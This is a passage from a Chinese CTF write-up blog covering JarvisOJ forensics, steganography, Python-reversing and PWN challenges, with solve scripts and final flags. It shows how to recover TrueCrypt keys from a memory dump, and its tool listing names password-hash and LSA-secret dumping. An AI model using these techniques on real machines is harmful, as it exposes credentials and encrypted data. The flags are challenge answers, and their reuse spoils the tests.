gditimers       Print installed GDI timers and callbacks</span><br><span class="line">        gdt             Display Global Descriptor Table</span><br><span class="line">        getservicesids  Get the names of services in the Registry and return Calculated SID</span><br><span class="line">        getsids         Print the SIDs owning each process</span><br><span class="line">        handles         Print list of open handles for each process</span><br><span class="line">        hashdump        Dumps passwords hashes (LM/NTLM) from memory</span><br><span class="line">        hibinfo         Dump hibernation file information</span><br><span class="line">        hivedump        Prints out a hive</span><br><span class="line">        hivelist        Print list of registry hives.</span><br><span class="line">        hivescan        Pool scanner for registry hives</span><br><span class="line">        hpakextract     Extract physical memory from an HPAK file</span><br><span class="line">        hpakinfo        Info on an HPAK file</span><br><span class="line">        idt             Display Interrupt Descriptor Table</span><br><span class="line">        iehistory       Reconstruct Internet Explorer cache / history</span><br><span class="line">        imagecopy       Copies a physical address space out as a raw DD image</span><br><span class="line">        imageinfo       Identify information for the image </span><br><span class="line">        impscan         Scan for calls to imported functions</span><br><span class="line">        joblinks        Print process job link information</span><br><span class="line">        kdbgscan        Search for and dump potential KDBG values</span><br><span class="line">        kpcrscan        Search for and dump potential KPCR values</span><br><span class="line">        ldrmodules      Detect unlinked DLLs</span><br><span class="line">        lsadump         Dump (decrypted) LSA secrets from the registry</span><br><span class="line">        machoinfo       Dump Mach-O file format information</span><br><span class="line">        malfind         Find hidden and injected code</span><br><span class="line">        mbrparser       Scans for and parses potential Master Boot Records (MBRs) </span><br><span class="line">        memdump         Dump the addressable memory for a process</span><br><span class="line">        memmap          Print the memory map</span><br><span class="line">        messagehooks    List desktop and thread window message hooks</span><br><span class="line">        mftparser       Scans for and parses potential MFT entries </span><br><span class="line">        moddump         Dump a kernel driver to an executable file sample</span><br><span class="line">        modscan         Pool scanner for kernel modules</span><br><span class="line">        modules         Print list of loaded modules</span><br><span class="line">        multiscan       Scan for various objects at once</span><br><span class="line">        mutantscan      Pool scanner for mutex objects</span><br><span class="line">        notepad         List currently displayed notepad text</span><br><span class="line">        objtypescan     Scan for Windows object type objects</span><br><span class="line">        patcher         Patches memory based on page scans</span><br><span class="line">        poolpeek        Configurable pool scanner plugin</span><br><span class="line">        printkey        Print a registry key, and its subkeys and values</span><br><span class="line">        privs           Display process privileges</span><br><span class="line">        procdump        Dump a process to an executable file sample</span><br><span class="line">        pslist          Print all running processes by following the EPROCESS lists </span><br><span class="line">        psscan          Pool scanner for process objects</span><br><span class="line">        pstree          Print process list as a tree</span><br><span class="line">        psxview         Find hidden processes with various process listings</span><br><span class="line">        qemuinfo        Dump Qemu information</span><br><span class="line">        raw2dmp         Converts a physical memory sample to a windbg crash dump</span><br><span class="line">        screenshot      Save a pseudo-screenshot based on GDI windows</span><br><span class="line">        servicediff     List Windows services (ala Plugx)</span><br><span class="line">        sessions        List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">        shellbags       Prints ShellBags info</span><br><span class="line">        shimcache       Parses the Application Compatibility Shim Cache registry key</span><br><span class="line">        shutdowntime    Print ShutdownTime of machine from registry</span><br><span class="line">        sockets         Print list of open sockets</span><br><span class="line">        sockscan        Pool scanner for tcp socket objects</span><br><span class="line">        ssdt            Display SSDT entries</span><br><span class="line">        strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">        svcscan         Scan for Windows services</span><br><span class="line">        symlinkscan     Pool scanner for symlink objects</span><br><span class="line">        thrdscan        Pool scanner for thread objects</span><br><span class="line">        threads         Investigate _ETHREAD and _KTHREADs</span><br><span class="line">        timeliner       Creates a timeline from various artifacts in memory </span><br><span class="line">        timers          Print kernel timers and associated module DPCs</span><br><span class="line">        truecryptmaster Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">        truecryptpassphrase TrueCrypt Cached Passphrase Finder</span><br><span class="line">        truecryptsummary    TrueCrypt Summary</span><br><span class="line">        unloadedmodules Print list of unloaded modules</span><br><span class="line">        userassist      Print userassist registry keys and information</span><br><span class="line">        userhandles     Dump the USER handle tables</span><br><span class="line">        vaddump         Dumps out the vad sections to a file</span><br><span class="line">        vadinfo         Dump the VAD info</span><br><span class="line">        vadtree         Walk the VAD tree and display in tree format</span><br><span class="line">        vadwalk         Walk the VAD tree</span><br><span class="line">        vboxinfo        Dump virtualbox information</span><br><span class="line">        verinfo         Prints out the version information from PE images</span><br><span class="line">        vmwareinfo      Dump VMware VMSS/VMSN information</span><br><span class="line">        volshell        Shell in the memory image</span><br><span class="line">        windows         Print Desktop Windows (verbose details)</span><br><span class="line">        wintree         Print Z-Order Desktop Windows Tree</span><br><span class="line">        wndscan         Pool scanner for window stations</span><br><span class="line">        yarascan        Scan process or kernel memory with Yara signatures</span><br></pre></td></tr></table></figure>
<p>先看一下这个系统的版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$volatility -f mem.vmem imageinfo</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.5</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/home/veritas/quzheng/mem.vmem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0xb18000L</span><br><span class="line">                          KDBG : 0x80546ae0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2016-05-03 04:41:19 UTC+0000</span><br><span class="line">     Image local date and time : 2016-05-03 12:41:19 +0800</span><br></pre></td></tr></table></figure>
<p>是xp系统，根据<code>Suggested Profile(s)</code>，我们用<code>pslist</code>打印当前运行的程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$volatility -f mem.vmem –profile=WinXPSP3x86 pslist</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.5</span><br><span class="line">Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0x821b9830 System                    4      0     62      253 ------      0                                                              </span><br><span class="line">0x81fb9210 smss.exe                552      4      3       19 ------      0 2016-05-03 04:32:10 UTC+0000                                 </span><br><span class="line">0x81c14da0 csrss.exe               616    552     10      328      0      0 2016-05-03 04:32:12 UTC+0000                                 </span><br><span class="line">0x81f81880 winlogon.exe            640    552     18      449      0      0 2016-05-03 04:32:12 UTC+0000                                 </span><br><span class="line">0x8208fda0 services.exe            684    640     16      260      0      0 2016-05-03 04:32:12 UTC+0000                                 </span><br><span class="line">0x81c32b10 lsass.exe               696    640     18      333      0      0 2016-05-03 04:32:12 UTC+0000                                 </span><br><span class="line">0x820a19a0 vmacthlp.exe            852    684      1       25      0      0 2016-05-03 04:32:13 UTC+0000                                 </span><br><span class="line">0x81c30458 svchost.exe             864    684     18      201      0      0 2016-05-03 04:32:13 UTC+0000                                 </span><br><span class="line">0x81c67020 svchost.exe             948    684     11      238      0      0 2016-05-03 04:32:13 UTC+0000                                 </span><br><span class="line">0x81ce7da0 svchost.exe            1040    684     55     1103      0      0 2016-05-03 04:32:13 UTC+0000                                 </span><br><span class="line">0x81c25020 svchost.exe            1096    684      4       66      0      0 2016-05-03 04:32:13 UTC+0000                                 </span><br><span class="line">0x82002b28 svchost.exe            1256    684     13      194      0      0 2016-05-03 04:32:14 UTC+0000                                 </span><br><span class="line">0x81f6c988 explorer.exe           1464   1448     12      329      0      0 2016-05-03 04:32:14 UTC+0000                                 </span><br><span class="line">0x82085550 spoolsv.exe            1576    684     13      140      0      0 2016-05-03 04:32:14 UTC+0000                                 </span><br><span class="line">0x81f64560 vmtoolsd.exe           1712   1464      5      145      0      0 2016-05-03 04:32:15 UTC+0000                                 </span><br><span class="line">0x820a3528 ctfmon.exe             1736   1464      1       78      0      0 2016-05-03 04:32:15 UTC+0000                                 </span><br><span class="line">0x81f7d3c0 vmtoolsd.exe           2020    684      7      273      0      0 2016-05-03 04:32:23 UTC+0000                                 </span><br><span class="line">0x8207db28 TPAutoConnSvc.e         512    684      5       99      0      0 2016-05-03 04:32:25 UTC+0000                                 </span><br><span class="line">0x81c26da0 alg.exe                1212    684      6      105      0      0 2016-05-03 04:32:26 UTC+0000                                 </span><br><span class="line">0x81f715c0 wscntfy.exe            1392   1040      1       39      0      0 2016-05-03 04:32:26 UTC+0000                                 </span><br><span class="line">0x81e1f520 TPAutoConnect.e        1972    512      1       72      0      0 2016-05-03 04:32:26 UTC+0000                                 </span><br><span class="line">0x81f9d3e8 TrueCrypt.exe          2012   1464      2      139      0      0 2016-05-03 04:33:36 UTC+0000</span><br></pre></td></tr></table></figure>
<p>除了系统进程和vmware的进程，只剩下一个<code>TrueCrypt.exe</code>了。</p>
<p>百度了一波，说是能加密磁盘，对应有一个叫<code>Elcomsoft Forensic Disk Decryptor</code>的软件，只要提供truecrypt的内存dump就可以解密磁盘了。</p>
<p>执行<code>memdump</code>来dump内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP3x86 memdump -p 2012 --dump-dir ~/quzheng/</span><br></pre></td></tr></table></figure>
<p>接下来交给<code>Elcomsoft Forensic Disk Decryptor</code>就好了。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_0483903376e00febdd26d091f551c747.png" alt=""></p>
<p>flag:<code>PCTF{T2reCrypt_15_N07_S3cu2e}</code></p>
<hr>
<h2 id="MISC-Class10"><a href="#MISC-Class10" class="headerlink" title="MISC - Class10"></a>MISC - Class10</h2><p>题目描述：</p>
<blockquote>
<p>听说神盾局的网络被日穿之后，有人从里面挖出来一个神秘的文件，咋一看也没什么，可是这可是class10保密等级的哦，里面一定暗藏玄机，你能发现其中暗藏的玄机吗？</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/class10.1c40ca6a83c607f424c23402abe53981" target="_blank" rel="noopener">class10.1c40ca6a83c607f424c23402abe53981</a></p>
</blockquote>
<p>首先是png头被改了，改回来发现假flag，输入是错的。</p>
<p>stegsolve看了一遍没什么问题。</p>
<p>binwalk扫一下发现问题了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e class10.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 1366 x 768, 8-bit/color RGBA, non-interlaced</span><br><span class="line">110           0x6E            Zlib compressed data, compressed</span><br><span class="line">1000073       0xF4289         Zlib compressed data, default compression</span><br></pre></td></tr></table></figure>
<p>一般来说png要么有zlib，要么只有一个，因为几个IDAT的内容是连续的，不能分开解压缩，所以只有一个zlib标志头。而这个png有两个，说明有一个有问题。</p>
<p>解压出来发现有一个里面的内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000100111011010101000000001111101010100111011110111110010001011100100111110101000100100010100101001011101010001001000101111011000111110100010011111011100001000000101111100000000101010101010101000000011111111011111001101111111111100100001100110100100001101001010011110101000011110001111100110000111001010111001010001111111100000000011011011101101110000100001111000011110000111001010000010010011111111100100101000010010110001010111001110011010000000000000000000101010101010101000001010000100100101110010110110110010100111101100000100101101000011111111100010111001100011101110010010110000000111110100000011001111111111001000000001110111100000001001100011001010100111011111010010010001100111010000100010101101001010100000100001000101110101010101001001110010001010110100110010110110110111110100000101100011011010000000001111100001100011110011</span><br></pre></td></tr></table></figure>
<p>长度为841，为29的平方，稍作处理可以看出是一张二维码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">       1  111 11 1 1 1       </span><br><span class="line"> 11111 1 1 1  111 1111 11111 </span><br><span class="line"> 1   1 111  1  11111 1 1   1 </span><br><span class="line"> 1   1 1  1 1  1 111 1 1   1 </span><br><span class="line"> 1   1 1111 11   11111 1   1 </span><br><span class="line"> 11111 111    1      1 11111 </span><br><span class="line">       1 1 1 1 1 1 1 1       </span><br><span class="line">11111111 11111  11 1111111111</span><br><span class="line">1  1    11  11 1  1    11 1  </span><br><span class="line">1 1  1111 1 1    1111   11111</span><br><span class="line">  11    111  1 1 111  1 1   1</span><br><span class="line">1111111         11 11 111 11 </span><br><span class="line">111    1    1111    1111    1</span><br><span class="line">11  1 1     1  1  111111111  </span><br><span class="line">1  1 1    1  1 11   1 1 111  </span><br><span class="line">111  11 1                   1</span><br><span class="line"> 1 1 1 1 1 1 1     1 1    1  </span><br><span class="line">1  1 111  1 11 11 11  1 1  11</span><br><span class="line">11 11     1  1 11 1    111111</span><br><span class="line">111   1 111  11   111 111  1 </span><br><span class="line"> 1 11       11111 1      11  </span><br><span class="line">1111111111  1        111 1111</span><br><span class="line">       1  11   11  1 1 1  111</span><br><span class="line"> 11111 1  1  1   11  111 1   </span><br><span class="line"> 1   1 1 11 1  1 1 1     1   </span><br><span class="line"> 1   1 111 1 1 1 1 1  1  111 </span><br><span class="line"> 1   1 1 11 1  11  1 11 11 11</span><br><span class="line"> 11111 1     1 11   11 11 1  </span><br><span class="line">       11111    11   1111  11</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">size=<span class="number">29</span></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (size, size))</span><br><span class="line"></span><br><span class="line">data = <span class="string">'0000000100111011010101000000001111101010100111011110111110010001011100100111110101000100100010100101001011101010001001000101111011000111110100010011111011100001000000101111100000000101010101010101000000011111111011111001101111111111100100001100110100100001101001010011110101000011110001111100110000111001010111001010001111111100000000011011011101101110000100001111000011110000111001010000010010011111111100100101000010010110001010111001110011010000000000000000000101010101010101000001010000100100101110010110110110010100111101100000100101101000011111111100010111001100011101110010010110000000111110100000011001111111111001000000001110111100000001001100011001010100111011111010010010001100111010000100010101101001010100000100001000101110101010101001001110010001010110100110010110110110111110100000101100011011010000000001111100001100011110011'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(size):</span><br><span class="line">        <span class="keyword">if</span> data[i * size + j] == <span class="string">'0'</span>:</span><br><span class="line">            im.putpixel([i, j], (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel([i, j], (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">'out.png'</span>)</span><br></pre></td></tr></table></figure>
<p>扫描即可</p>
<p>flag:<code>PCTF{e32f2543fd5e246272eb7d15cc72a8ec}</code></p>
<hr>
<h2 id="MISC-You-Need-Python"><a href="#MISC-You-Need-Python" class="headerlink" title="MISC - You Need Python"></a>MISC - You Need Python</h2><p>题目描述：</p>
<blockquote>
<p>人生苦短我用Python。</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/%E9%A2%98%E7%9B%AE%EF%BC%9Ayou_need_python.zip.74d515955b9aa607b488a48437591a14" target="_blank" rel="noopener">you_need_python.zip.74d515955b9aa607b488a48437591a14</a></p>
</blockquote>
<p>先看<code>key_is_here_but_do_you_know_rfc4042</code>，根据提示<code>rfc4042</code>，得知这是utf9编码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utf9</span><br><span class="line"></span><br><span class="line">enc = open(<span class="string">'key_is_here_but_do_you_know_rfc4042'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line">dec = utf9.utf9decode(enc)</span><br><span class="line">open(<span class="string">'key'</span>,<span class="string">'wb'</span>).write(dec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</span><br></pre></td></tr></table></figure>
<p>脑洞一下，‘_’*n = n。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">enc=<span class="string">'_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>,<span class="number">20</span>)):</span><br><span class="line">    enc = enc.replace(<span class="string">'_'</span>*i,str(i))</span><br><span class="line"><span class="keyword">print</span> eval(enc)</span><br><span class="line"><span class="comment">#5287002131074331513</span></span><br><span class="line"><span class="comment">#I_4m-k3y</span></span><br></pre></td></tr></table></figure>
<p>再看flag.py。</p>
<p>百度一波marshal.loads，知道了他接受的参数是python opcode。</p>
<p>随便找一个pyc，加上magic header和时间戳，扔到pyc反编译网站上去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def sha1(string):</span><br><span class="line">    return hashlib.sha1(string).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calc(strSHA1):</span><br><span class="line">    r = 0</span><br><span class="line">    for i in strSHA1:</span><br><span class="line">        r += int(&apos;0x%s&apos; % i, 16)</span><br><span class="line">    </span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(plain, key):</span><br><span class="line">    keySHA1 = sha1(key)</span><br><span class="line">    intSHA1 = calc(keySHA1)</span><br><span class="line">    r = []</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        r.append(ord(plain[i]) + int(&apos;0x%s&apos; % keySHA1[i % 40], 16) - intSHA1)</span><br><span class="line">        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])</span><br><span class="line">    </span><br><span class="line">    return &apos;&apos;.join(map((lambda x: str(x)), r))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    key = raw_input(&apos;[*] Please input key:&apos;)</span><br><span class="line">    plain = raw_input(&apos;[*] Please input flag:&apos;)</span><br><span class="line">    encryptText = encrypt(plain, key)</span><br><span class="line">    cipherText = &apos;-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164&apos;</span><br><span class="line">    if encryptText == cipherText:</span><br><span class="line">        print &apos;[&gt;] Congratulations! Flag is: %s&apos; % plain</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print &apos;[!] Key or flag is wrong, try again:)&apos;</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
<p>发现是逐位生成的，不动脑子直接爆破。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def sha1(string):</span><br><span class="line">    return hashlib.sha1(string).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calc(strSHA1):</span><br><span class="line">    r = 0</span><br><span class="line">    for i in strSHA1:</span><br><span class="line">        r += int(&apos;0x%s&apos; % i, 16)</span><br><span class="line">    </span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(plain, key):</span><br><span class="line">    keySHA1 = sha1(key)</span><br><span class="line">    intSHA1 = calc(keySHA1)</span><br><span class="line">    r = []</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        r.append( ord(plain[i]) + int(&apos;0x%s&apos; % keySHA1[i % 40], 16) - intSHA1 )</span><br><span class="line">        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])</span><br><span class="line"></span><br><span class="line">    return &apos;&apos;.join(map((lambda x: str(x)), r))</span><br><span class="line"></span><br><span class="line">def encrypt2(plain, key):</span><br><span class="line">    keySHA1 = sha1(key)</span><br><span class="line">    intSHA1 = calc(keySHA1)</span><br><span class="line">    r = []</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        r.append( ord(plain[i]) + int(&apos;0x%s&apos; % keySHA1[i % 40], 16) - intSHA1 )</span><br><span class="line">        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">def burp():</span><br><span class="line">    key = &apos;I_4m-k3y&apos;</span><br><span class="line">    cipherText = [-185,-147,-211,-221,-164,-217,-188,-169,-205,-174,-211,-225,-191,-234,-148,-199,-198,-253,-175,-157,-222,-135,-240,-229,-201,-154,-178,-187,-244,-183,-212,-222,-164]</span><br><span class="line">    plain=&apos;&apos;</span><br><span class="line">    for i in range(33):</span><br><span class="line">        for j in range(30,127):</span><br><span class="line">            tmp = plain+chr(j)</span><br><span class="line">            encryptText = encrypt2(tmp, key)</span><br><span class="line">            if encryptText[i] == cipherText[i]:</span><br><span class="line">                plain+=chr(j)</span><br><span class="line">                break</span><br><span class="line">    return plain</span><br><span class="line"></span><br><span class="line">print burp()</span><br></pre></td></tr></table></figure>
<p>flag:   <code>flag{Lif3_i5_5h0r7_U_n33d_Py7h0n}</code></p>
<hr>
<h2 id="PWN-61dctf-inst"><a href="#PWN-61dctf-inst" class="headerlink" title="PWN - 61dctf_inst"></a>PWN - 61dctf_inst</h2><p>题目描述:</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9893<br><a href="https://dn.jarvisoj.com/challengefiles/inst.rar.f926ac0cccc5c343a1b0202167aa6600" target="_blank" rel="noopener">inst.rar.f926ac0cccc5c343a1b0202167aa6600</a></p>
</blockquote>
<p>这题是google ctf的原题,当时没有做出来,看过wp…</p>
<p>就不分析了,网上挺多的.</p>
<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 